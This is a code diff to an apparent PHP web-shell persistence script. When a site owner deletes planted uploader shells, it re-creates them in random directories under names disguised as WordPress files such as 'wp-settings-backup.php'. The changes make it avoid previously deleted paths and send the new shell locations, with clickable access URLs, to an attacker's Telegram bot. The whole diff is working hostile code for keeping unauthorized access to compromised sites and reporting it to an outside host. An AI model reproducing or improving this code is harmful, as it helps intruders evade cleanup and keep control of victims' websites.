@@ -544,26 +544,36 @@ function createBackupUploaders($webRoot, $uploaderContent, $count = 3) {
             echo "\n🚨 UPLOADER ADAPTIVE MODE!\n";
             echo "Detected {$deletedCount} uploader deletions (cache age: " . round($cacheAge/3600, 1) . "h)\n";
             
-            sendTelegramAlert($deletedCount, $status['deleted'], $cacheAge);
-            
             $directories = getAllDirs($webRoot);
-            if (count($directories) < $deletedCount) {
-                $deletedCount = count($directories);
+            
+            $deletedDirs = array_keys($status['deleted']);
+            $availableDirs = array_filter($directories, function($dir) use ($webRoot, $deletedDirs) {
+                $subdirKey = str_replace($webRoot, '', $dir);
+                return !in_array($subdirKey, $deletedDirs);
+            });
+            
+            if (count($availableDirs) < $deletedCount) {
+                $deletedCount = count($availableDirs);
             }
             
-            shuffle($directories);
-            $newDirs = array_slice($directories, 0, $deletedCount);
+            shuffle($availableDirs);
+            $newDirs = array_slice($availableDirs, 0, $deletedCount);
             
             $uploaderNames = [
                 'wp-settings-backup.php', 'theme-update-check.php', 'plugin-verify.php',
                 'system-check.php', 'health-monitor.php', 'maintenance-mode.php'
             ];
             
+            $newUploaderMap = [];
             foreach ($newDirs as $index => $dir) {
                 $subdirKey = str_replace($webRoot, '', $dir);
                 $uploaderName = $uploaderNames[$index % count($uploaderNames)];
-                $uploaderMap[$subdirKey] = $uploaderName;
+                $newUploaderMap[$subdirKey] = $uploaderName;
             }
+            
+            sendTelegramAlert($deletedCount, $status['deleted'], $cacheAge, $newUploaderMap);
+            
+            $uploaderMap = array_merge($status['existing'], $newUploaderMap);
             
             echo "🎯 Created {$deletedCount} NEW uploader locations\n";
             echo "✅ Kept {$existingCount} existing uploaders\n\n";
@@ -711,7 +721,7 @@ function detectUnexpectedDeletion($webRoot, $shellMap) {
     ];
 }
 
-function sendTelegramAlert($deletedCount, $deletedFiles, $cacheAge) {
+function sendTelegramAlert($deletedCount, $deletedFiles, $cacheAge, $newLocations = []) {
     global $telegramBotToken, $telegramChatId;
     
     $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
@@ -741,6 +751,33 @@ function sendTelegramAlert($deletedCount, $deletedFiles, $cacheAge) {
     $alertMessage .= "  ✅ Avoiding deleted paths\n";
     $alertMessage .= "  ✅ Keeping existing shells intact\n\n";
     
+    if (!empty($newLocations)) {
+        $alertMessage .= "📂 <b>New Files Created:</b>\n";
+        $count = 0;
+        foreach ($newLocations as $subdir => $filename) {
+            if ($count >= 5) {
+                $remaining = count($newLocations) - 5;
+                $alertMessage .= "  • <i>... and {$remaining} more</i>\n";
+                break;
+            }
+            $alertMessage .= "  • <code>{$subdir}/{$filename}</code>\n";
+            $count++;
+        }
+        $alertMessage .= "\n";
+        
+        $alertMessage .= "🔗 <b>Access Now:</b>\n";
+        $count = 0;
+        foreach ($newLocations as $subdir => $filename) {
+            if ($count >= 3) {
+                break;
+            }
+            $url = "https://{$domain}{$subdir}/{$filename}";
+            $alertMessage .= "  • <a href=\"{$url}\">{$filename}</a>\n";
+            $count++;
+        }
+        $alertMessage .= "\n";
+    }
+    
     $alertMessage .= "💡 <b>Analysis:</b>\n";
     if ($deletedCount < 10) {
         $alertMessage .= "  ⚠️ Targeted deletion (owner found specific files)\n";
@@ -751,13 +788,15 @@ function sendTelegramAlert($deletedCount, $deletedFiles, $cacheAge) {
     }
     
     $alertMessage .= "\n⏰ " . date('Y-m-d H:i:s') . "\n";
-    $alertMessage .= "━━━━━━━━━━━━━━━━";
+    $alertMessage .= "━━━━━━━━━━━━━━━━\n\n";
+    $alertMessage .= "<i>If you find anything suspicious or need support, chat</i> <a href=\"https://t.me/lamentpicasso\">@lamentpicasso</a> 🐋";
     
     $url = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
     $data = [
         'chat_id' => $telegramChatId,
         'text' => $alertMessage,
-        'parse_mode' => 'HTML'
+        'parse_mode' => 'HTML',
+        'disable_web_page_preview' => false
     ];
     
     $ch = curl_init($url);
@@ -833,9 +872,9 @@ function uploadFilesToAllDirs($dir, $shellContent, $shellMarker) {
             echo "\n🚨 ADAPTIVE MODE ACTIVATED!\n";
             echo "Detected {$deletedCount} unexpected deletions (cache age: " . round($cacheAge/3600, 1) . "h)\n";
             
-            sendTelegramAlert($deletedCount, $status['deleted'], $cacheAge);
-            
             $newLocations = createRandomLocations($dir, $deletedCount, $shellMarker, $usedFilenames);
+            
+            sendTelegramAlert($deletedCount, $status['deleted'], $cacheAge, $newLocations);
             
             $shellMap = array_merge($status['existing'], $newLocations);
             
